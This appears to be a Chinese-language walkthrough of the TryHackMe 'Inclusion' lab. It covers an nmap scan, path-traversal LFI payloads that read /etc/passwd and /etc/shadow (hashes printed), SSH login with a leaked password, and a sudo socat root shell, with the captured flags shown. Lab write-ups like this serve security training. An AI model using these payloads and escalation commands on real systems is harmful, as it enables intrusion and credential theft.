# 服务发现
```
┌──(root💀kali)-[~/tryhackme/inclusion]
└─#  nmap -sV -Pn 10.10.161.161                         
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-22 22:26 EDT
Nmap scan report for 10.10.161.161
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.22 seconds
```
# 利用LFI查看/etc/passwd
payload :```http://10.10.161.161/article?name=../../../../etc/passwd```

```
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin 
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin 
syslog:x:102:106::/home/syslog:/usr/sbin/nologin 
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin 
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin 
lxd:x:105:65534::/var/lib/lxd/:/bin/false 
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin 
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin 
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin 
pollinate:x:109:1::/var/cache/pollinate:/bin/false 
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash 
# falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false 

```

# 查看/etc/shadow
payload :```http://10.10.161.161/article?name=../../../../etc/shadow```

```
root:$6$mFbzBSI/$c80cICObesNyF9XxbF6h6p6U2682MfG5gxJ5KtSLrGI8766/etwzBvppTuug6aLoltiSmeqdIaEUg6f/NLYDn0:18283:0:99999:7::: daemon:*:17647:0:99999:7::: 
 bin:*:17647:0:99999:7::: 
 sys:*:17647:0:99999:7::: 
 sync:*:17647:0:99999:7::: 
 games:*:17647:0:99999:7::: 
 man:*:17647:0:99999:7::: 
 lp:*:17647:0:99999:7::: 
 mail:*:17647:0:99999:7::: 
 news:*:17647:0:99999:7::: 
 uucp:*:17647:0:99999:7::: 
 proxy:*:17647:0:99999:7::: 
 www-data:*:17647:0:99999:7::: 
 backup:*:17647:0:99999:7::: 
 list:*:17647:0:99999:7::: 
 irc:*:17647:0:99999:7::: 
 gnats:*:17647:0:99999:7::: 
 nobody:*:17647:0:99999:7::: 
 systemd-network:*:17647:0:99999:7::: 
 systemd-resolve:*:17647:0:99999:7::: 
 syslog:*:17647:0:99999:7::: 
 messagebus:*:17647:0:99999:7::: 
 _apt:*:17647:0:99999:7::: 
 lxd:*:18281:0:99999:7::: 
 uuidd:*:18281:0:99999:7::: 
 dnsmasq:*:18281:0:99999:7::: 
 landscape:*:18281:0:99999:7::: 
 pollinate:*:18281:0:99999:7::: falconfeast:$6$dYJsdbeD$rlYGlx24kUUcSHTc0dMutxEesIAUA3d8nQeTt6FblVffELe3FxLE3gOID5nLxpHoycQ9mfSC.TNxLxet9BN5c/:18281:0:99999:7::: sshd:*:18281:0:99999:7::: mysql:!:18281:0:99999:7::: 

 ```

可以看到爆出了```root```和```falconfeast```的加密密码,我们放到john中破解,但是跑了好久沒有破解出來

留意/etc/passwd这一行
```# falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin ```
rootpassword就是falconfeast的明文密码，但是被注释了

用```falconfeast：rootpassword```登录，拿到user.txt
```
┌──(root💀kali)-[~/tryhackme/inclusion]
└─#  ssh falconfeast@10.10.161.161       
The authenticity of host '10.10.161.161 (10.10.161.161)' can't be established.
ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.161.161' (ECDSA) to the list of known hosts.
falconfeast@10.10.161.161's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Sep 23 09:12:49 IST 2021

  System load:  0.08              Processes:           86
  Usage of /:   34.8% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.161.161
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

3 packages can be updated.
3 updates are security updates.


Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
falconfeast@inclusion:~$ cat user.txt 
60989655118397345799
```

# 查看sudo -l查看本账号的特殊权限
利用socat提权到root，拿到root.txt
```
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
falconfeast@inclusion:~$ sudo socat stdin exec:/bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
cat /root/root.txt
42964104845495153909
```


# # 第二种拿flag的方法
# 尝试用LFI读取本地user和root flag,居然读到了-_-！

user.txt
payload:```http://10.10.161.161/article?name=../../../../home/falconfeast/user.txt```

root.txt
payload:```http://10.10.161.161/article?name=../../../../root/root.txt```